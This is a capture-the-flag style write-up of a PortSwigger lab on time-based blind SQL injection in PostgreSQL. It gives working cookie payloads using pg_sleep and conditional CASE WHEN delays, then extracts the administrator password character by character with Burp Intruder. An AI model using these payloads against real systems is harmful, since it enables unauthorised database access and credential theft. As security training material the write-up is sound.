# Blind SQL injection with time delays and information retrieval

This lab extends the time-based blind SQL injection technique. The
tracking cookie is used in a SQL query, but the result and error
behavior do not provide a direct indication of the data being queried.

Because the query executes synchronously, a conditional delay can act as
a true/false signal. The database contains a `users` table with
`username` and `password` columns, and the goal is to retrieve the
administrator password.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/blind
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

A direct PostgreSQL sleep can first be confirmed with:

``` text
COOKIE'||pg_sleep(10)--
```

``` text
jIPoq0qYcS0Y2AmF'||pg_sleep(10)--
```

A conditional expression can then be used so that the delay happens only
when the condition evaluates to true:

``` text
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

The corresponding payloads are:

``` text
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

The next step is to make the condition depend on a password character.
The following query checks whether the first character is `a`:

``` text
SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END
```

``` text
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```

The request can be sent to Intruder and tested against possible
characters.

<img width="587" height="328" alt="1" src="https://github.com/user-attachments/assets/8deebabc-5de2-4f19-a13e-b665a684fa34" />


The character that produces the noticeably longer response is `v`.

<img width="643" height="134" alt="2" src="https://github.com/user-attachments/assets/3a9c4a98-e1bd-4178-8da3-c7ce885943f1" />


The same test is repeated for every password position until the complete
password is obtained:

``` text
v06vaymszli7v131izpv
```

<img width="586" height="382" alt="3" src="https://github.com/user-attachments/assets/4aec60e7-2ca1-48be-9ec8-42ed884bfcf1" />

